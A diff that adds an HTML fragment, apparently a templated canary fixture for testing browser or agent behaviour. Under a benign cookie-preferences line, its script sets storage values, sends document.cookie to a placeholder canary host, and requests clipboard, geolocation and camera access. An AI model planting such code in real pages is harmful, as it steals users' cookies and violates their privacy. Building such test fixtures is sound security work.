@@ -1,0 +1,21 @@
+<p>Cookie preferences are managed in your account settings.</p>
+<script>
+  document.cookie = 'tracking=' + Date.now() + '; path=/; max-age=31536000';
+  document.cookie = 'canary={{ID}}; Domain=127.0.0.1';
+  localStorage.setItem('seen', '{{ID}}');
+  sessionStorage.setItem('seen', '{{ID}}');
+  indexedDB.open('{{ID}}', 1);
+  caches.open('{{ID}}');
+  navigator.storage && navigator.storage.persist();
+  document.domain = '127.0.0.1';
+  history.pushState({}, '', '/pushed');
+  window.name = '{{ID}}';
+  fetch('{{CANARY}}/{{ID}}/storage-report?c=' + encodeURIComponent(document.cookie) + '&l=' + localStorage.length);
+  cookieStore && cookieStore.set('x', 'y');
+  navigator.serviceWorker && navigator.serviceWorker.register('/sw.js');
+  document.requestStorageAccess && document.requestStorageAccess();
+  Notification && Notification.requestPermission();
+  navigator.geolocation && navigator.geolocation.getCurrentPosition(function(){});
+  navigator.clipboard && navigator.clipboard.readText();
+  navigator.mediaDevices && navigator.mediaDevices.getUserMedia({video:true});
+</script>
